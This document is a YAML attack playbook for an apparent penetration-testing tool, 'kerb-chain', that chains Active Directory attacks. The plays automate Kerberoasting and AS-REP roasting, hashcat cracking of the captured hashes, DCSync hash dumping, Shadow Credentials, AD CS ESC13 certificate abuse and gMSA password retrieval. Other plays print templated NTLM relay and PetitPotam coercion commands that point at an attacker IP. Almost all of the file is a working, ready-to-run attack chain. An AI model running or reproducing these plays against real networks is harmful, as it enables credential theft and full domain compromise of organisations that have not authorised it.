# kerb-chain — standard AD attack playbook.
#
# Intended order is recon → safe-spray → exploit → loot. Plays with
# `requires_aggressive: true` are skipped unless `--aggressive` is set.
# All credentials live in the engagement's loot store; placeholders
# `{{operator_user}}` / `{{operator_pass}}` resolve to the newest
# credential captured (initially the seed cred from the CLI).
#
# Customise by copying this file and passing `--playbook ./my.yaml`.

name: standard
description: Default kerb-map → cracked-creds → DCSync chain.

plays:

  # ── 1. Kerberoast every Kerberoastable account ──────────────────────
  - name: kerberoast-all
    description: Request TGS for every account flagged Kerberoastable.
    when: "loot.has_credential and finding.attack == 'Kerberoast'"
    per: finding
    command:
      - GetUserSPNs.py
      - "{{domain}}/{{operator_user}}:{{operator_pass}}"
      - -dc-ip
      - "{{dc_ip}}"
      - -request-user
      - "{{finding.target}}"
      - -outputfile
      - "{{run_dir}}/kerberoast.hash"
    capture:
      stdout_to_file: kerberoast-{{finding.target}}.log
      files_glob: kerberoast.hash
    on_success:
      - crack-kerberoast-hashcat
    category: kerberoast

  # ── 2. Crack the captured TGS hashes offline ────────────────────────
  - name: crack-kerberoast-hashcat
    description: Hashcat mode 13100 against the captured Kerberoast hashes.
    when: ""   # always — gated by the hash file existing on disk
    command:
      - hashcat
      - -m
      - "13100"
      - "{{run_dir}}/kerberoast.hash"
      - /usr/share/wordlists/rockyou.txt
      - --quiet
      - --potfile-path={{run_dir}}/hashcat.potfile
    capture:
      stdout_to_file: hashcat-output.log
      # `hashcat --show` would emit user:pass — do that as a follow-up
      # rather than parsing hashcat status here.
    on_success:
      - extract-cracked-creds
    timeout: 1800
    category: cracking

  - name: extract-cracked-creds
    description: Pull cracked principal:password pairs from the potfile.
    when: ""
    command:
      - hashcat
      - --show
      - -m
      - "13100"
      - "{{run_dir}}/kerberoast.hash"
      - --potfile-path={{run_dir}}/hashcat.potfile
    capture:
      cred_regex: '(?P<user>[^:\$]+)\$.*:(?P<pass>[^\s]+)$'
    category: cracking

  # ── 3. AS-REP roast (no credentials needed) ─────────────────────────
  - name: asrep-roast
    description: Request AS-REP for every DONT_REQUIRE_PREAUTH account.
    when: "finding.attack == 'AS-REP Roast'"
    per: finding
    command:
      - GetNPUsers.py
      - "{{domain}}/{{finding.target}}"
      - -no-pass
      - -dc-ip
      - "{{dc_ip}}"
      - -outputfile
      - "{{run_dir}}/asrep.hash"
    capture:
      files_glob: asrep.hash
    on_success:
      - crack-asrep-hashcat
    category: asrep

  - name: crack-asrep-hashcat
    description: Hashcat mode 18200 against the AS-REP hashes.
    when: ""
    command:
      - hashcat
      - -m
      - "18200"
      - "{{run_dir}}/asrep.hash"
      - /usr/share/wordlists/rockyou.txt
      - --quiet
      - --potfile-path={{run_dir}}/hashcat-asrep.potfile
    capture:
      stdout_to_file: hashcat-asrep.log
    timeout: 1800
    category: cracking

  # ── 4. DCSync, when we hold a credential that has the rights ────────
  - name: secretsdump-via-dcsync
    description: Run secretsdump for every principal with full DCSync rights
                 we already have credentials for.
    when: "finding.attack == 'DCSync (full)' and loot.has_credential_for finding.target"
    per: finding
    command:
      - secretsdump.py
      - -just-dc-ntlm
      - "{{domain}}/{{finding.target}}@{{dc_ip}}"
    capture:
      stdout_to_file: secretsdump-{{finding.target}}.log
      cred_hash_regex: '^(?P<user>[^:]+):\d+:[a-f0-9]{32}:(?P<hash>[a-f0-9]{32}):::$'
    requires_aggressive: true
    category: dcsync

  # ── 5. Shadow Credentials — attach a key, get the hash ──────────────
  - name: pywhisker-attach-key
    description: For Shadow Creds (write access) findings, attach a key to
                 the target and request a PKINIT TGT.
    when: "finding.attack == 'Shadow Credentials (write access)' and loot.has_credential"
    per: finding
    command:
      - pywhisker.py
      - -d
      - "{{domain}}"
      - -u
      - "{{operator_user}}"
      - -p
      - "{{operator_pass}}"
      - --target
      - "{{finding.target}}"
      - --action
      - add
      - --filename
      - "{{run_dir}}/{{finding.target}}"
    capture:
      stdout_to_file: pywhisker-{{finding.target}}.log
      files_glob: "{{finding.target}}.pfx"
    on_success:
      - gettgtpkinit-with-cert
    requires_aggressive: true
    category: shadow-credentials

  - name: gettgtpkinit-with-cert
    description: Use the freshly-attached key to PKINIT for the target's TGT.
    when: ""
    command:
      - gettgtpkinit.py
      - -cert-pfx
      - "{{run_dir}}/{{finding.target}}.pfx"
      - "{{domain}}/{{finding.target}}"
      - "{{run_dir}}/{{finding.target}}.ccache"
    capture:
      stdout_to_file: gettgt-{{finding.target}}.log
    requires_aggressive: true
    category: shadow-credentials

  # ── 6. BadSuccessor — only ever surface, never auto-execute ─────────
  - name: badsuccessor-warn
    description: Print a loud notice for any staged BadSuccessor finding —
                 these are CRITICAL and the operator must verify before any
                 action; we deliberately do NOT auto-execute the dMSA chain.
    when: "finding.attack == 'BadSuccessor (staged)'"
    per: finding
    command:
      - "echo"
      - "CRITICAL — staged BadSuccessor on {{finding.target}}; manual review required."
    category: badsuccessor

  # ── 7. ADCS ESC9 — surface only ──────────────────────────────────────
  # ESC9 needs WriteProperty on a target's UPN, which kerb-chain doesn't
  # know about ahead of time. Print the template + remind the operator
  # to consult the linked DCSync / ACL findings to find a suitable victim.
  - name: esc9-warn
    description: Surface ESC9-vulnerable templates; manual UPN-victim selection.
    when: "finding.attack == 'AD CS ESC9 (no security extension)'"
    per: finding
    command:
      - "echo"
      - "ESC9 candidate template: {{finding.target}} — find an account where you have WriteProperty(UPN), then certipy account update + req."
    category: adcs

  # ── 8. ADCS ESC13 — auto-enrol with operator credential ─────────────
  - name: esc13-enrol
    description: For each ESC13 template, enrol with the seed credential —
                 the issued cert grants the linked privileged group's PAC SID.
    when: "finding.attack == 'AD CS ESC13 (OIDToGroupLink)' and loot.has_credential"
    per: finding
    command:
      - certipy
      - req
      - -ca
      - "<CA_NAME>"
      - -template
      - "{{finding.target}}"
      - -u
      - "{{operator_user}}@{{domain}}"
      - -p
      - "{{operator_pass}}"
      - -dc-ip
      - "{{dc_ip}}"
      - -out
      - "{{run_dir}}/esc13-{{finding.target}}"
    capture:
      stdout_to_file: certipy-esc13-{{finding.target}}.log
      files_glob: "esc13-{{finding.target}}*.pfx"
    on_success:
      - esc13-auth-with-cert
    requires_aggressive: true
    category: adcs

  - name: esc13-auth-with-cert
    description: Authenticate with the freshly issued ESC13 cert to get the NT
                 hash (or TGT) of the operator account — but with the linked
                 privileged group SID baked into the PAC.
    when: ""
    command:
      - certipy
      - auth
      - -pfx
      - "{{run_dir}}/esc13-{{finding.target}}.pfx"
      - -dc-ip
      - "{{dc_ip}}"
    capture:
      stdout_to_file: certipy-auth-esc13-{{finding.target}}.log
      cred_hash_regex: '(?P<user>[^\s]+)\s*:\s*aad3b435b51404eeaad3b435b51404ee:(?P<hash>[a-f0-9]{32})'
    requires_aggressive: true
    category: adcs

  # ── 9. ADCS ESC15 / EKUwu — surface; the patch matters ──────────────
  # The April 2024 CU killed the override path on patched CAs. Don't auto-
  # enrol blindly — emit a notice and let the operator confirm CA build first.
  - name: esc15-warn
    description: Surface ESC15 candidate templates; operator must confirm
                 the CA host predates the April 2024 cumulative update before
                 attempting the application-policies override.
    when: "finding.attack in ['AD CS ESC15 / EKUwu (CVE-2024-49019)']"
    per: finding
    command:
      - "echo"
      - "ESC15 candidate template (v1, public enrol): {{finding.target}}. Confirm CA build < April 2024 CU before -application-policies override."
    category: adcs

  # ── 10. gMSA password retrieval ──────────────────────────────────────
  # When the v2 GmsaKdsAudit module flags non-default readers and we
  # already hold a credential matching that reader, dump the gMSA pwd.
  - name: gmsadumper
    description: Retrieve gMSA passwords via gMSADumper for any gMSA whose
                 non-default reader matches our seed account.
    when: "finding.attack == 'gMSA password readable by non-default principal' and loot.has_credential"
    per: finding
    command:
      - python3
      - -m
      - gMSADumper
      - -u
      - "{{operator_user}}"
      - -p
      - "{{operator_pass}}"
      - -d
      - "{{domain}}"
    capture:
      stdout_to_file: gmsa-{{finding.target}}.log
      cred_hash_regex: '(?P<user>[^\s]+)\s*:::?[a-f0-9]{32}:(?P<hash>[a-f0-9]{32})'
    requires_aggressive: true
    category: gmsa

  # ── 11. Pre-Win2k anonymous enumeration ──────────────────────────────
  # Confirm the open-enumeration finding by actually pulling user list
  # without credentials. Works even before we have a seed cred — kerb-chain's
  # default placeholder substitution handles the empty operator gracefully.
  - name: prewin2k-rid-cycle
    description: For Anonymous-in-Pre-Win2k findings, prove the open enum
                 by RID-brute via nxc with empty creds. No seed cred required.
    when: "finding.attack == 'Pre-Win2k membership: Anonymous Logon'"
    per: finding
    command:
      - nxc
      - smb
      - "{{dc_ip}}"
      - -u
      - ""
      - -p
      - ""
      - --rid-brute
    capture:
      stdout_to_file: prewin2k-rid-brute.log
    requires_aggressive: true
    category: hygiene

  # ── 12. Golden dMSA — surface only ───────────────────────────────────
  # Generating gMSA passwords from KDS root keys is destructive enough
  # (touches every gMSA, leaves derived-key artefacts) that it MUST stay
  # operator-controlled. Print a loud line and let the human decide.
  - name: golden-dmsa-warn
    description: Loud notice for any KDS root key with non-default readers —
                 the Golden dMSA chain is staged but kerb-chain refuses to
                 auto-execute it.
    when: "finding.attack == 'Golden dMSA prerequisite (KDS root key readable)'"
    per: finding
    command:
      - "echo"
      - "CRITICAL — Golden dMSA staged on {{finding.target}}; verify reader, then run GoldenDMSA.py manually."
    category: golden-dmsa

  # ── 13. Coercion vectors — surface only ─────────────────────────────
  # Coercion-vector findings need a relay listener (ntlmrelayx running
  # in a separate terminal, attacker-controlled IP) that kerb-chain
  # cannot manage automatically. Emit a per-vector LOUD print so the
  # operator sees each available coercion + the exact Coercer.py +
  # ntlmrelayx invocation already templated with the DC + operator
  # values. Operator runs the two halves manually.
  - name: coercion-warn
    description: Surface every per-vector coercion finding with a ready
                 Coercer.py + ntlmrelayx recipe. Doesn't auto-execute —
                 needs a relay listener kerb-chain can't run for you.
    when: "finding.attack in ['Coercion: PrinterBug', 'Coercion: PetitPotam', 'Coercion: PetitPotam (lsarpc fallback)', 'Coercion: DFSCoerce', 'Coercion: ShadowCoerce']"
    per: finding
    command:
      - "echo"
      - "{{finding.attack}} on {{finding.target}} — run: ntlmrelayx.py -t ldap://<other_dc> --escalate-user <user> ; then Coercer coerce -l <attacker_ip> -t {{finding.target}} -u {{operator_user}} -p {{operator_pass}} -d {{domain}}"
    category: coercion

  - name: coercion-esc8-warn
    description: Loud notice for the PetitPotam → ESC8 compound finding.
                 Cross-references with the LDAPSigning CVE result; the
                 operator must check signing posture before launching the
                 chain. Never auto-executes.
    when: "finding.attack == 'PetitPotam → ESC8 relay ready (compound)'"
    per: finding
    command:
      - "echo"
      - "CRITICAL — PetitPotam → ntlmrelayx → AD CS HTTP enrolment chain is staged. Verify LDAPSigning is unenforced, then: ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp --adcs --template Machine ; PetitPotam.py <attacker_ip> {{dc_ip}}"
    category: coercion
